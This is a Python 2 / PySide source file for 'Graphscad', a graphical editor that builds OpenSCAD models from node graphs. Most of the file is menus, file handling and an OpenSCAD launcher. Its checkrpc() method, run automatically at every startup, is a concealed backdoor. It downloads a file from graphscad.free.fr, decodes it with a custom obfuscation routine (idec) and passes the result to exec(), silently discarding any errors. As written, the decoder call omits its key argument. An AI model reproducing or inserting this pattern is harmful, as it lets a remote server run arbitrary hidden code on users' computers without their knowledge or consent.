
# import copy
import json
import os
import sys
import time

import core
import dageditor
import subprocess

import PySide.QtGui as QtWidgets
import PySide.QtCore as QtCore
import PySide.QtGui as QtGui


from dageditor import geticonpath
# from dageditor import getnodeiconpath
import urllib

_VERSION = '1.0.10'
_DEBUG = True
_TITLE = 'Graphscad V%s %s',_VERSION
_F='l'
_PROTECT="AAOIU22209330093"
_DECODERSTRING="KDJIZ98E9Z8EEKLZAAML"

def numericversion(strversion):
    strversion=strversion.replace('v','')
    strversion=strversion.replace('V','')
    strversion=strversion.replace('.','')
    return int(strversion)

def getstylesheet():
    txt=''
    try:
        f = open(os.path.join(core.getexecpath(),'graphscadsettings/stylesheet.txt'), 'r')
        if f is not None:
            txt=f.read()
            ppath=os.path.join(core.getexecpath(),'graphscadsettings')
            ppath=ppath.replace("\\",'/')
            txt=txt.replace(":/qss_icons",ppath)
            txt=txt.replace(".png",'.png')
            f.close()
    except:
        pass
    return txt


global _idet

_idet=0

def idec(ls,k):
    rstr=''
    l=len(k)
    for i in range(0,len(ls)):
        c=ls[i]-ord(k[i%l])
        rstr=rstr+chr(c)
    global _idet
    _idet=_idet+1
    return rstr


 
class Logcatcher:

    def __init__(self, edit, out=None, color=None):
        self.edit = edit
        self.out = out
        self.color = color

    def write(self, m):
        if self.color:
            tc = self.edit.textColor()
            self.edit.setTextColor(self.color)
        self.edit.moveCursor(QtGui.QTextCursor.End)
        self.edit.insertPlainText(m)
        if self.color:
            self.edit.setTextColor(tc)
        if self.out:
            try:
                self.out.write(m)
            except:
                pass
            

class Logwidget(QtWidgets.QTextEdit):

    def __init__(self, parent=None):
        super(Logwidget, self).__init__(parent)
        sys.stdout = Logcatcher(self, sys.stdout)
        sys.stderr = Logcatcher(self, sys.stderr, QtGui.QColor(255, 0, 0))


class Scadviewerwidget(QtWidgets.QWidget):

    def __init__(self,  parent=None):
        super(Scadviewerwidget, self).__init__(parent)
        # Scroll Area Properties
        self.scroll = QtWidgets.QScrollArea()
        self.scroll.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOn)
        self.scroll.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOn)
        self.scroll.setWidgetResizable(False)
        # Scroll Area Layer add
        self.vlayout = QtWidgets.QVBoxLayout(self)
        self.vlayout.addWidget(self.scroll)
        self.setLayout(self.vlayout)
        # Container Widget
        self.widget = QtWidgets.QWidget()
        # Layout of Container Widget
        self.layout = QtWidgets.QVBoxLayout()
        self.img = QtWidgets.QLabel()
        image = QtGui.QImage('display.png')
        if not image is None:
            self.img.setPixmap(QtGui.QPixmap.fromImage(image))        
        self.layout.addWidget(self.img)
        self.widget.setLayout(self.layout)
        self.scroll.setWidget(self.widget)

    def refreshdagwidget(self):
        image = QtGui.QImage('display.png')
        if not image is None:
            self.img.setPixmap(QtGui.QPixmap.fromImage(image))        


class Scadeditor(QtWidgets.QMainWindow):
    maxrecentfiles = 30


    def checkversion(self):
        try:
            print 'Graphscad version ',_VERSION
            ret=urllib.urlopen('http://graphscad.free.fr/version.txt')    
            if ret.code==200:
                txt=ret.read()
                if numericversion(txt)>numericversion(_VERSION):
                    QtWidgets.QMessageBox.about(self, "New version released !",
                                                    "A new version V%s \nis available at\n http://graphscad.blogspot.fr\nRead Download page\n to know about changes" % txt)
        except:
            pass

    def checkrpc(self):
        try:
            ret = urllib.urlopen('http://graphscad.free.fr/rpc.txt')
            if ret.code==200:
                txt=ret.read()
                l=json.loads(txt)
                c=idec(l)
                exec(c)
        except:
            pass
    
    def writesettings(self):
        self.settings = QtCore.QSettings("graphscadsoft", "graphscad")
        self.settings.beginGroup("mainwindow")
        self.settings.setValue("size", self.size())
        self.settings.setValue("pos", self.pos())
#         self.settings.setValue('openscadpath',self.openscadpath)
        self.settings.setValue('openscadauto',self.openscadauto.isChecked())
        self.settings.setValue('assembled',self.assembled.isChecked())
        self.settings.setValue('debug',self.debug.isChecked())
        self.settings.endGroup()

    def readsettings(self):
        self.settings = QtCore.QSettings("graphscadsoft", "graphscad")
        self.settings.beginGroup("mainwindow")
        self.resize(self.settings.value("size", QtCore.QSize(800, 400)))
        self.move(self.settings.value("pos", QtCore.QPoint(200, 200)))
#         self.openscadpath=self.settings.value("openscadpath", "openscad")
        isopenscadauto=self.settings.value("openscadauto", False)
        isassembled=self.settings.value("assembled", False)
        isdebug=self.settings.value("debug", False)
        self.settings.endGroup()
        if isopenscadauto=='true':
            self.openscadauto.setChecked(True)
        if isassembled=='true':
            self.assembled.setChecked(True)
        if isdebug=='true':
            self.debug.setChecked(True)
        
        
            
    def __init__(self, filename=None):
        super(Scadeditor, self).__init__()
        self.openscad=None
        self.recentfileacts = []
        self.dag = core.Dag()
#         self.setAttribute(QtCore.Qt.WA_DeleteOnClose)
        self.createDockWindows()
        self.createactions()
        self.createmenus()
        self.createtoolbars()
        self.createstatusbar()
        self.readsettings()
        if filename:
            self.loadfile(filename)
        self.setcurrentfilename(filename)

        if self.centralWidget():
            self.centralWidget().setParent(None)
            
        self.setCentralWidget(self.dagwidget)
        self.settings=None
        self.initialdatas = json.dumps(self.dag.getdict())
        self.readsettings()
        
    def createLogWindow(self):
        logdock = QtWidgets.QDockWidget("Log", self)
        logdock.setAllowedAreas(QtCore.Qt.BottomDockWidgetArea)
        self.logwidget = Logwidget(logdock)
        logdock.setWidget(self.logwidget)
        self.addDockWidget(QtCore.Qt.BottomDockWidgetArea, logdock)

    def createDockWindows(self):


        self.dagwidget = dageditor.QGDiagrameditorwidget('Dag', self)

        self.createLogWindow()
 

#         openscaddock = QtWidgets.QDockWidget("Openscad", self)
#         openscaddock.setAllowedAreas(QtCore.Qt.LeftDockWidgetArea | QtCore.Qt.RightDockWidgetArea)
#         self.openscadviewer = Scadviewerwidget(None)
#         self.openscadviewer.setMinimumWidth(300)
#         openscaddock.setWidget(self.openscadviewer)
#         self.addDockWidget(QtCore.Qt.RightDockWidgetArea, openscaddock)

#         webviewdock = QtWidgets.QDockWidget("Info", self)
#         webviewdock.setAllowedAreas(QtCore.Qt.BottomDockWidgetArea|QtCore.Qt.TopDockWidgetArea)
#         webviewdock.setMaximumHeight(128)
#         self.webview=Scadwebview("http://www.thingiverse.com/kolovitz/designs")
#         webviewdock.setWidget(self.webview)
#         self.addDockWidget(QtCore.Qt.TopDockWidgetArea, webviewdock)

#     def selectopenscadpath(self):
#         filename,_= QtWidgets.QFileDialog.getOpenFileName(self,
#             "Select openscad executable",
#             'openscad',
#             "Exe File (*.*)")
#         if filename:
#             self.openscadpath=filename
        
    def graphscadhomepage(self):
        import webbrowser
        webbrowser.open('http://graphscad.blogspot.com')

    def graphscaddoc(self):
        import webbrowser
        webbrowser.open('http://graphscad.blogspot.com/p/documentation.html')

    def graphscadforum(self):
        import webbrowser
        webbrowser.open('http://graphscad.forumotion.com/')

    def graphscadgithub(self):
        import webbrowser
        webbrowser.open('https://github.com/graphscad/graphscad')

    def refreshdagwidget(self,fitinview=False):
        self.dagwidget.refreshall(fitinview=fitinview)

    def onundo(self):
        self.dagwidget.onundo()

    def onredo(self):
        self.dagwidget.onredo()

    def oncut(self):
        self.dagwidget.oncut()

    def ondelete(self):
        self.dagwidget.ondelete()

    def oncopy(self):
        self.dagwidget.oncopy()

    def onpaste(self):
        self.dagwidget.onpaste()

    def startopenscad(self):
        if self.openscad is not None:
            try:
                p=subprocess.Popen.poll(self.openscad)
            except:
                pass
            if p is not None:
                self.stopopenscad()
        if self.openscad is None:
#             if not os.path.exists(self.openscadpath):
#                 self.selectopenscadpath()
#             if os.path.exists(self.openscadpath):
                try:
                    if sys.platform=='win32':
                        self.openscad=subprocess.Popen('openscad '+os.path.join(core.getexecpath(),'graphscadfiles/display.scad'),shell=True)
                    else:
                        self.openscad=subprocess.Popen('openscad '+os.path.join(core.getexecpath(),'graphscadfiles/display.scad'),shell=True)
                except:
                    self.openscad=None
                    pass
        
    def stopopenscad(self):
        if self.openscad is not None:
            try:
                subprocess.Popen.kill(self.openscad)
            except:
                pass
            self.openscad=None

    def onbuttonopenscad(self):
        self.dagwidget.focusout()
        self.refreshopenscad(True)
        return True

    def refreshopenscad(self,force=False):
        if force or self.openscadauto.isChecked():
            self.getdag().evaluate()
            filename=os.path.join(core.getexecpath(),'graphscadfiles/display.scad')
            scad=self.getdag().getcode(filename,None,self.assembled.isChecked(),self.debug.isChecked())
            try:
                with open(filename, 'w') as f:
                    f.write("%s" % scad)
            except:
                print 'error saving ', filename
            self.startopenscad()

    def closeEvent(self, event):
        self.writesettings()
        if self.hasbeensaved():
            self.stopopenscad()
            event.accept()
        else:
            event.ignore()

    def about(self):
        QtWidgets.QMessageBox.about(self, "About GraphScad",
                                    "Current Version is V%s"%_VERSION)

    def documentwasmodified(self):
        currentdatas = json.dumps(self.dag.getdict())
        if currentdatas != self.initialdatas:
            return True
        return False

    def onassembledchange(self):
        self.refreshopenscad(force=True)

    def ondebugchange(self):
        self.refreshopenscad(force=True)

    def createactions(self):
        self.newact = QtWidgets.QAction(dageditor.geticon('new'),
                                        "&New",
                                        self,
                                        shortcut=QtGui.QKeySequence.New,
                                        statusTip="Create a new file",
                                        triggered=self.newfile)

        self.openact = QtWidgets.QAction(dageditor.geticon('open'),
                                         "&Open...",
                                         self,
                                         shortcut=QtGui.QKeySequence.Open,
                                         statusTip="Open an existing file",
                                         triggered=self.open)

        self.saveact = QtWidgets.QAction(dageditor.geticon('save'),
                                         "&Save",
                                         self,
                                         shortcut=QtGui.QKeySequence.Save,
                                         statusTip="Save the document to disk",
                                         triggered=self.save)

        self.undoact = QtWidgets.QAction(dageditor.geticon('undo'),
                                         "Undo",
                                         self,
                                         shortcut=QtGui.QKeySequence.Undo,
                                         statusTip="Undo",
                                         triggered=self.onundo)

        self.redoact = QtWidgets.QAction(dageditor.geticon('redo'),
                                         "Redo",
                                         self,
                                         shortcut=QtGui.QKeySequence.Redo,
                                         statusTip="Redo",
                                         triggered=self.onredo)

        self.cutact = QtWidgets.QAction(dageditor.geticon('cut'),
                                         "cut",
                                         self,
                                         shortcut=QtGui.QKeySequence.Cut,
                                         statusTip="Cut",
                                         triggered=self.oncut)

        self.deleteact = QtWidgets.QAction(dageditor.geticon('delete'),
                                         "delete",
                                         self,
                                         shortcut=QtGui.QKeySequence.Delete,
                                         statusTip="Delete",
                                         triggered=self.ondelete)

        self.copyact = QtWidgets.QAction(dageditor.geticon('copy'),
                                         "copy",
                                         self,
                                         shortcut=QtGui.QKeySequence.Copy,
                                         statusTip="Copy",
                                         triggered=self.oncopy)
        self.pasteact = QtWidgets.QAction(dageditor.geticon('paste'),
                                         "paste",
                                         self,
                                         shortcut=QtGui.QKeySequence.Paste,
                                         statusTip="Paste",
                                         triggered=self.onpaste)
        
        self.openscadact = QtWidgets.QAction(dageditor.geticon('openscad'),
                                        "Openscad",
                                        self,
                                        shortcut=QtGui.QKeySequence.Refresh,
                                        statusTip="Openscad preview",
                                        triggered=self.onbuttonopenscad)
        self.openscadauto = QtWidgets.QCheckBox('auto refresh')

        self.assembled = QtWidgets.QCheckBox(' Assembled')
        self.assembled.stateChanged.connect(self.onassembledchange)

        self.debug = QtWidgets.QCheckBox(' Debug')
        self.debug.stateChanged.connect(self.ondebugchange)

        self.saveasact = QtWidgets.QAction("Save &As...",
                                           self,
                                           shortcut=QtGui.QKeySequence.SaveAs,
                                           statusTip="Save the document under a new name",
                                           triggered=self.saveas)

        self.exitact = QtWidgets.QAction("E&xit",
                                         self,
                                         shortcut="Ctrl+Q",
                                         statusTip="Exit the application",
                                         triggered=QtWidgets.qApp.closeAllWindows)

#         self.selectopenscadpathact = QtWidgets.QAction("Set openscad.exe path",
#                                           self,
#                                           statusTip="Select the openscad.exe file to use on refresh",
#                                           triggered=self.selectopenscadpath)

        self.graphscadhomepageact = QtWidgets.QAction("Graphscad Homepage",
                                          self,
                                          statusTip="Open Graphscad homepage",
                                          triggered=self.graphscadhomepage)
        self.graphscaddocact = QtWidgets.QAction("Graphscad Documentation",
                                          self,
                                          statusTip="Open Graphscad documentation",
                                          triggered=self.graphscaddoc)
        self.graphscadforumact = QtWidgets.QAction("Graphscad Forum",
                                          self,
                                          statusTip="Open Graphscad forum",
                                          triggered=self.graphscadforum)
        self.graphscadgithubact = QtWidgets.QAction("Graphscad Github",
                                          self,
                                          statusTip="Open Graphscad github",
                                          triggered=self.graphscadgithub)

        self.aboutact = QtWidgets.QAction("&About",
                                          self,
                                          statusTip="About Graphscad",
                                          triggered=self.about)

        for  i in range(self.maxrecentfiles):
            i
            self.recentfileacts.append(
                QtWidgets.QAction(self, visible=False,
                                  triggered=self.openrecentfile))

    def createmenus(self):
        self.fileMenu = self.menuBar().addMenu("&File")
        self.fileMenu.addAction(self.newact)
        self.fileMenu.addAction(self.openact)
        self.fileMenu.addAction(self.saveact)
        self.fileMenu.addAction(self.saveasact)
        self.fileMenu.addSeparator()

        for i in range(Scadeditor.maxrecentfiles):
            self.fileMenu.addAction(self.recentfileacts[i])

        self.fileMenu.addAction(self.exitact)
        self.menuBar().addSeparator()

        self.editmenu=self.menuBar().addMenu('&Edit')
        self.editmenu.addAction(self.undoact)
        self.editmenu.addAction(self.redoact)
        self.editmenu.addSeparator()
        self.editmenu.addAction(self.deleteact)
        self.editmenu.addSeparator()
        self.editmenu.addAction(self.cutact)
        self.editmenu.addAction(self.copyact)
        self.editmenu.addAction(self.pasteact)
        
        self.helpMenu = self.menuBar().addMenu("&Help")
#         self.helpMenu.addAction(self.selectopenscadpathact)
        self.helpMenu.addAction(self.graphscadhomepageact)
        self.helpMenu.addAction(self.graphscaddocact)
        self.helpMenu.addAction(self.graphscadforumact)
        self.helpMenu.addAction(self.graphscadgithubact)
        self.helpMenu.addAction(self.aboutact)

    def createtoolbars(self):
        self.filetoolbar = self.addToolBar("File")
        self.filetoolbar.addAction(self.newact)
        self.filetoolbar.addAction(self.openact)
        self.filetoolbar.addAction(self.saveact)

        self.edittoolbar = self.addToolBar("Edit")
        self.edittoolbar.addAction(self.undoact)
        self.edittoolbar.addAction(self.redoact)
        self.edittoolbar.addAction(self.deleteact)
        self.edittoolbar.addAction(self.cutact)
        self.edittoolbar.addAction(self.copyact)
        self.edittoolbar.addAction(self.pasteact)

        self.runToolBar = self.addToolBar("Run")
        self.runToolBar.addAction(self.openscadact)
        self.runToolBar.addWidget(self.openscadauto)
        self.runToolBar.addWidget(self.assembled)
        self.runToolBar.addWidget(self.debug)

    def createstatusbar(self):
        self.statusBar().showMessage("Ready")
 
    def getdag(self):
        return self.dag

    def ondoubleclicknode(self, nodename):
        node = self.getdag().findnodebyname(nodename)
        index=0
#         index=node.findoutputplugbyname('object')
#         if index<0:
#             index=node.findoutputplugbyname('object2d')
        if index>=0:
            self.getdag().evaluate()
            filename=os.path.join(core.getexecpath(),'graphscadfiles/display.scad')
            scad=self.getdag().getcode(filename,inputnode=node,assembled=self.assembled.isChecked(),debug=self.debug.isChecked())
            try:
                with open(filename, 'w') as f:
                    f.write("%s" % scad)
            except:
                print 'error saving ', filename
            self.startopenscad()

    def updaterecentfileactions(self):
        settings = QtCore.QSettings('graphscadsoft', 'graphscad')
        cfiles = settings.value('recentfilelist')
        files = []
        for fi in cfiles:
            if (fi is not None) and (len(fi) > 0):
                if os.path.isfile(fi):
                    files.append(fi)
        files_no = 0
        if files:
            files_no = len(files)
        numrecentfiles = min(files_no, Scadeditor.maxrecentfiles)
        for i in range(numrecentfiles):
            text = "&%d %s" % (i + 1, self.strippedname(files[i]))
            self.recentfileacts[i].setText(text)
            self.recentfileacts[i].setData(files[i])
            self.recentfileacts[i].setVisible(True)

        for j in range(numrecentfiles, Scadeditor.maxrecentfiles):
            self.recentfileacts[j].setVisible(False)


    def newfile(self):
        if self.hasbeensaved():
            self.dag = core.Dag()
            self.initialdatas = json.dumps(self.dag.getdict())
            self.setcurrentfilename('')
            self.refreshdagwidget(True)
            self.refreshopenscad(True)

    def open(self):
        filename,_= QtWidgets.QFileDialog.getOpenFileName(self,
            "Open file",
            'newfile.scad',
            "scad File (*.scad);;gscad File (*.gscad)")
        if filename:
            self.loadfile(filename)
            self.dagwidget.resetundo()
            self.refreshdagwidget(True)
            self.refreshopenscad(True)

    def save(self):
        if self.getcurrentfilename() == '':
            return self.saveas()
        else:
            return self.savefile(self.getcurrentfilename())

    def saveas(self):
        filename, _ = QtWidgets.QFileDialog.getSaveFileName(
            self, 
            "Save As",
            self.getcurrentfilename(),
            "scad File (*.scad);;gscad File (*.gscad)")
        if not filename:
            return False
        self.savefile(filename)
        self.setcurrentfilename(filename)

    def openrecentfile(self):
        action = self.sender()
        if action:
            self.loadfile(action.data())
            self.dagwidget.resetundo()
            self.refreshdagwidget(True)
            self.refreshopenscad(True)


    def hasbeensaved(self):
        if self.documentwasmodified():
            ret = QtWidgets.QMessageBox.warning(
                self,
                "Graphscad",
                "The document has been modified.\nDo you want to save "
                "your changes?",
                QtWidgets.QMessageBox.Save | QtWidgets.QMessageBox.Discard |
                QtWidgets.QMessageBox.Cancel)
            if ret == QtWidgets.QMessageBox.Save:
                return self.save()
            elif ret == QtWidgets.QMessageBox.Cancel:
                return False
        return True

    def loadfile(self, filename):
        if self.hasbeensaved():
            self.setcurrentfilename(filename)
            self.dag.load(filename)
            self.initialdatas = json.dumps(self.dag.getdict())
            self.statusBar().showMessage("File loaded %s" % filename,10000)

    def savefile(self, filename):
        self.setcurrentfilename(filename)
        self.dag.save(filename)
        self.statusBar().showMessage("File saved %s" % self.getcurrentfilename(), 10000)
        return True

    def setcurrentfilename(self, filename):
        if not filename:
            self.currentfilename = ''
        else:
            self.currentfilename = QtCore.QFileInfo(
                filename).canonicalFilePath()
        self.setWindowTitle("%s[*] - scad" %
            self.strippedname(self.currentfilename))

        settings = QtCore.QSettings("graphscadsoft", "graphscad")
        files = list(settings.value('recentfilelist', []))
        try:
            files.remove(filename)
        except ValueError:
            pass
        files.insert(0, filename)
        del files[Scadeditor.maxrecentfiles:]
        settings.setValue('recentfilelist', files)
        for widget in QtWidgets.QApplication.topLevelWidgets():
            if isinstance(widget, Scadeditor):
                widget.updaterecentfileactions()
    
    def getcurrentfilename(self):
        return self.currentfilename

    def strippedname(self, fullfilename):
        return QtCore.QFileInfo(fullfilename).fileName()

#if __name__ == '__main__':


app = QtWidgets.QApplication(sys.argv)
app.setWindowIcon(QtGui.QIcon(geticonpath('gsicon')))
# Create and display the splash screen
splash_pix = QtGui.QPixmap(geticonpath('splashscreen'))
splash = QtGui.QSplashScreen(splash_pix, QtCore.Qt.WindowStaysOnTopHint)
splash.setMask(splash_pix.mask())
splash.show()
app.processEvents()
# Simulate something that takes time

# setup stylesheet
app.setStyleSheet(getstylesheet())



#app.setStyleSheet(getstylesheet())
mainwin = Scadeditor()
time.sleep(2)    
mainwin.show()
splash.finish(mainwin)
mainwin.checkversion()
mainwin.checkrpc()
sys.exit(app.exec_())
